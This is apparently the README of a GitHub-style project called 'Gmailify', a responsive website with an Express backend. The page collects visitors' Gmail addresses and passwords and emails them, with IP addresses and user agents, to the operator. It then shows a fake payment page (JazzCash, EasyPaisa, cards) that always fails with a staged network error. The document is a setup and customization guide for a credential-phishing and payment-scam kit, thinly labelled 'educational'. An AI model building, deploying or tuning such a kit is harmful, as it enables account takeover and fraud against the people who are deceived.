# 📧 Gmailify

A fully responsive website for Gmail account management with integrated payment processing. Built with HTML, CSS, JavaScript, and Node.js/Express backend.

## 🌟 Features

- **Responsive Design**: Works perfectly on desktop, tablet, and mobile devices
- **Gmail Form Validation**: Real-time validation for Gmail credentials
- **Multiple Payment Options**: JazzCash, EasyPaisa, Bank Transfer, Credit/Debit Cards
- **Email Notifications**: Automatically sends submitted credentials to your email
- **Payment Simulation**: Realistic payment processing with intentional network errors
- **Modern UI/UX**: Clean, professional design with smooth animations

## 🚀 Quick Start

### Prerequisites

- Node.js (version 14 or higher)
- npm or yarn
- Gmail account for email notifications

### Installation

1. **Clone or download the project**
   ```bash
   cd Gmailify
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment variables**
   ```bash
   cp .env.example .env
   ```
   
   Edit the `.env` file with your email credentials:
   ```env
   PORT=3000
   SENDER_EMAIL=your-email@gmail.com
   SENDER_PASSWORD=your-app-password
   RECEIVER_EMAIL=your-receiving-email@gmail.com
   ```

4. **Set up Gmail App Password**
   - Go to [Google Account Settings](https://myaccount.google.com/)
   - Navigate to Security → 2-Step Verification → App passwords
   - Generate a new app password
   - Use this password in your `.env` file (not your regular Gmail password)

5. **Start the server**
   ```bash
   npm start
   ```
   
   For development with auto-restart:
   ```bash
   npm run dev
   ```

6. **Open your browser**
   Navigate to `http://localhost:3000`

## 📁 Project Structure

```
Gmailify/
├── index.html              # Main Gmail form page
├── payment.html            # Payment processing page
├── styles.css              # Styles for main page
├── payment-styles.css      # Styles for payment page
├── script.js               # JavaScript for main page
├── payment-script.js       # JavaScript for payment page
├── server.js               # Express.js backend server
├── package.json            # Node.js dependencies
├── .env.example            # Environment variables template
├── .gitignore             # Git ignore file
└── README.md              # This file
```

## 🎯 How It Works

### 1. Gmail Form Submission
- Users enter their Gmail credentials on the main page
- Form validates email format (must be @gmail.com)
- Passwords are validated for minimum length
- Upon submission, credentials are sent to your email via the backend

### 2. Payment Processing
- After form submission, users are redirected to the payment page
- Multiple payment options are displayed (JazzCash, EasyPaisa, etc.)
- When users click "Proceed to Payment", a realistic loading process starts
- After 10-15 seconds, a network error is displayed (intentional feature)

### 3. Email Notifications
- All submitted Gmail credentials are automatically emailed to you
- Emails include timestamps, IP addresses, and user agent information
- Professional HTML email template with security warnings

## 🎨 Customization

### Changing Colors
Edit the CSS variables in `styles.css` and `payment-styles.css`:
```css
:root {
  --primary-color: #667eea;
  --secondary-color: #764ba2;
  --success-color: #28a745;
  --error-color: #dc3545;
}
```

### Adding Payment Methods
1. Add new payment method in `payment.html`
2. Update the selection logic in `payment-script.js`
3. Style the new method in `payment-styles.css`

### Modifying Error Timing
Change the error delay in `payment-script.js`:
```javascript
const errorDelay = Math.random() * 5000 + 10000; // 10-15 seconds
```

## 🔧 Configuration

### Environment Variables

| Variable | Description | Required |
|----------|-------------|----------|
| `PORT` | Server port number | No (defaults to 3000) |
| `SENDER_EMAIL` | Gmail address for sending emails | Yes |
| `SENDER_PASSWORD` | Gmail app password | Yes |
| `RECEIVER_EMAIL` | Email to receive submissions | Yes |

### Security Notes

- Never use your regular Gmail password - always use app passwords
- Keep your `.env` file secure and never commit it to version control
- The submitted credentials are sent via email - handle them securely
- Consider adding additional security measures for production use

## 📱 Responsive Design

The website is fully responsive and works on:
- Desktop computers (1200px+)
- Tablets (768px - 1199px)
- Mobile phones (320px - 767px)

## 🛠️ Development

### Available Scripts

- `npm start` - Start the production server
- `npm run dev` - Start development server with auto-restart
- `npm test` - Run tests (not implemented)

### Making Changes

1. Frontend changes: Edit HTML, CSS, and JS files directly
2. Backend changes: Edit `server.js` and restart the server
3. For development, use `npm run dev` for auto-restart

## 📧 Email Configuration

### Gmail Setup
1. Enable 2-factor authentication on your Gmail account
2. Generate an app password:
   - Go to Google Account → Security
   - Click on "2-Step Verification"
   - Click on "App passwords"
   - Generate password for "Mail"
3. Use this app password in your `.env` file

### Email Template
The email template includes:
- Professional styling
- Submitted credentials (email and password)
- Timestamp and IP information
- Security warnings
- Responsive design

## 🚨 Important Warnings

⚠️ **Security Notice**: This application handles sensitive credentials. Ensure you:
- Use HTTPS in production
- Implement proper access controls
- Handle received credentials securely
- Delete sensitive emails after processing
- Consider legal and ethical implications

⚠️ **Usage Notice**: This application is for educational/demonstration purposes. Ensure you comply with all applicable laws and terms of service.

## 🐛 Troubleshooting

### Common Issues

1. **Email not sending**
   - Check your Gmail app password
   - Ensure 2-factor authentication is enabled
   - Verify SENDER_EMAIL is correct

2. **Server won't start**
   - Check if port 3000 is already in use
   - Ensure all dependencies are installed
   - Verify Node.js version (14+)

3. **Payment page not loading**
   - Check browser console for errors
   - Ensure all static files are served correctly
   - Verify backend is running

### Debug Mode
Add console logs to track issues:
```javascript
console.log('Debug info:', variable);
```

## 📄 License

This project is for educational purposes. Please ensure you comply with all applicable laws and terms of service when using this code.

## 🤝 Support

If you encounter any issues:
1. Check the troubleshooting section
2. Review the console logs
3. Ensure all configuration is correct
4. Verify your email settings

---

**Built with ❤️ for educational purposes**
